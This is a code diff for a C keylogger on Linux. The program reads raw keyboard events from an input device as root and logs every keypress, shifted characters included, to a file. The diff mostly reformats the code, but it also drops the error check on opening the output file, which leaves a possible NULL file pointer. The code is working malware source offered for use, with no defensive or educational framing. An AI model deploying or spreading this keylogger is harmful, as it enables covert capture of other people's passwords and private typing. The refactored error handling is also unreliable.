@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <linux/input.h>
@@ -11,7 +12,7 @@
 #define UK "UNKNOWN"
 
 
-static const char * keycodes[] =
+static const char *keycodes[] =
 {
     "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
     "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
@@ -27,7 +28,7 @@ static const char * keycodes[] =
     "PAUSE"
 };
 
-static const char * shifted_keycodes[] =
+static const char *shifted_keycodes[] =
 {
     "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
     "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
@@ -56,8 +57,7 @@ static void sig_handler(int signo)
 
 static void keylogger_usage(void)
 {
-    printf(
-            "\n"
+    printf("\n"
             "Usage:\n"
             "     sudo ./keyloger -f file\n"
             "\n"
@@ -84,7 +84,7 @@ static int keylogger_isRoot(void) {
     return 1;	
 }
 
-void keylogger_init (char *ofile)
+void keylogger_init(char *ofile)
 {
     signal(SIGINT, sig_handler);
 
@@ -103,7 +103,7 @@ void keylogger_init (char *ofile)
     }
 }
 
-void keylogger_exit (void)
+void keylogger_exit(void)
 {
     close(keyboard_fd);
 }
@@ -114,49 +114,34 @@ void keylogger_run(void)
     FILE *file = NULL;
     struct input_event event;
 
-    if (output_file) {
-        file = fopen(output_file, "w");
-        if (!file) {
-            fprintf(stderr, "Error opening file\n");
-            return;
-        }
-    }
+    file = fopen(output_file, "w");
 
     while (running) {
         read(keyboard_fd, &event, sizeof(event));
 
         /* If a key from the keyboard is pressed */
         if (event.type == EV_KEY && event.value == 1) {
-            /* If it's Esc, exit */
-            if (keylogger_isEsc(event.code)) return;
-            /* If it's shift (left or right), set the flag */
-            if (keylogger_isShift(event.code)) shift_flag = event.code;
-            /* If it's shift and another key, print the shifted value */
-            if (shift_flag && !keylogger_isShift(event.code)) {
-                /* Output to file */
-                if (output_file != NULL) {
-                    fprintf(file, "%s + %s\n",
-                            keycodes[shift_flag], shifted_keycodes[event.code]);
-                    fflush(file);
-                }
-            }
-            /* If it's not shift, just print the key */
-            else if (!shift_flag && !keylogger_isShift(event.code)) {
-                /* Again, output to file */
-                if (output_file != NULL) {
-                    fprintf(file, "%s\n", keycodes[event.code]);
-                    fflush(file);
-                }
-            }
-        } else {
+            if (keylogger_isEsc(event.code))
+                return;
+
+            if (keylogger_isShift(event.code))
+                shift_flag = event.code;
+
+            if (shift_flag && !keylogger_isShift(event.code))
+                fprintf(file, "%s\n", shifted_keycodes[event.code]);
+            
+            else if (!shift_flag && !keylogger_isShift(event.code))
+                fprintf(file, "%s\n", keycodes[event.code]);
+
+            fflush(file);
+        }
+        else {
             /* If a key from the keyboard is released */
-            if (event.type == EV_KEY && event.value == 0) {
-                if (keylogger_isShift(event.code)) shift_flag = 0;
-            }
+            if (event.type == EV_KEY && event.value == 0)
+                if (keylogger_isShift(event.code))
+                    shift_flag = 0;
         }
     }
 
-    if (file) fclose(file);
-
-    return;
+    fclose(file);
 }
